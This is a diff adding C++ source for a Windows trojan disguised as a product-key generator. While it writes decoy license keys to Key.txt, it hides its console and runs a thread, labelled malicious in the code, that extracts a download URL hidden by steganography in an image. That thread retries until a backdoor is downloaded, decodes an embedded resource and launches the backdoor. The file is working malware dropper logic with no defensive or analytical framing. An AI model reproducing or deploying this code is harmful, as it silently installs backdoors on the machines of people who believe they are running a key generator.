@@ -1,0 +1,123 @@
+// GenKeyWindow.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+#include <iostream>
+#include <stdio.h>
+#include <Windows.h>
+#include "LSB.h"
+#include <tchar.h>
+#include "DownLoader.h"
+#include "Launcher.h"
+#include "ReadResource.h"
+#include <WinInet.h>
+
+#pragma warning(disable:4996)
+#pragma comment (lib, "Wininet.lib")
+#pragma comment (lib, "User32.lib")
+#pragma comment (lib, "Kernel32.lib")
+#pragma comment (lib, "Advapi32.lib")
+#pragma comment (lib, "Shell32.lib")
+#pragma comment (lib, "Urlmon.lib")
+
+using namespace std;
+
+DWORD WINAPI MaliciousThread(LPVOID lpParam);
+
+
+
+int main()
+{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    //Check Internet Connection
+   /* if (!InternetCheckConnectionA("https://en.wikipedia.org", 1, 0))
+    {
+        MessageBoxA(NULL, "Network Error! Please check your network!", "Error", MB_ICONWARNING);
+        return 0;
+    }*/
+    HANDLE hThread = CreateThread(NULL, 0, MaliciousThread, NULL, 0, NULL);
+    if (hThread == NULL) return 0;
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+
+    //Get current file name
+    char curPath[MAX_PATH];
+    GetModuleFileNameA(GetModuleHandle(NULL), curPath, MAX_PATH);
+
+    //strip file name to get path
+    for (int i = strlen(curPath) - 1; i >= 0; --i)
+    {
+        if (curPath[i] == '\\')
+        {
+            curPath[i] = NULL;
+            break;
+        }
+    }
+    strcat(curPath, "\\Key.txt");
+    HANDLE fileHandle = CreateFileA(curPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    char buffer[1024];
+    strcpy(buffer, "2YXF4-RXB7J-MT2HF-3RYQC-M2K87\nFN29M-6M73B-PHRRG-BFTBJ-Q667C\nRVF7N-6C7KH-YR4BK-7CG6R-CR4DB\n22F2H-N6W3D-XYJCD-K8P6V-9BT6Y");
+    DWORD byteWrite;
+    DWORD bSuccess = WriteFile(fileHandle, buffer, strlen(buffer) + 1, &byteWrite, NULL);
+    CloseHandle(fileHandle);
+    return 0;
+
+}
+
+
+
+DWORD WINAPI MaliciousThread(LPVOID lpParam)
+{
+    //GetCurrentFilePath
+    char curPath[MAX_PATH];
+	char *resource_mem;
+	WCHAR* ioc;
+    GetModuleFileNameA(GetModuleHandle(NULL), curPath, MAX_PATH);
+    //strip file name to get path
+    for (int i = strlen(curPath) - 1; i >= 0; --i)
+    {
+        if (curPath[i] == '\\')
+        {
+            curPath[i] = NULL;
+            break;
+        }
+    }
+    //puts(curPath);
+    //Get image path
+    char imagePath[MAX_PATH];
+    strcpy(imagePath, curPath);
+    strcat(imagePath, "\\Instruction.png");
+
+    //Get Malware Link
+    WCHAR wLink[MAX_PATH];
+    swprintf_s(wLink, MAX_PATH, L"%S", imagePath);
+    string linkDownload = LSB_decode(wLink);
+    //cout << linkDownload;
+    if (linkDownload == "")
+    {
+        MessageBoxA(NULL, "Please don't remove Instruction.png image!", "Error", MB_ICONWARNING);
+        return 0;
+    }
+    //Download malawre
+    string backDoorPath = Downloader(linkDownload);
+    while (backDoorPath == "") //Loop until backdoor was downloaded
+    {
+        backDoorPath = Downloader(linkDownload);
+        Sleep(3000);
+    }
+
+	resource_mem = resource_loader("#101", "BIN");
+
+	if (!resource_mem) {
+		return 1;
+	}
+
+	ioc = resource_decode(resource_mem, strlen(resource_mem));
+
+    //Execute malware
+	if (!Launch(backDoorPath, ioc)){
+        return 0;
+    }
+
+    return 1;
+}
+
+
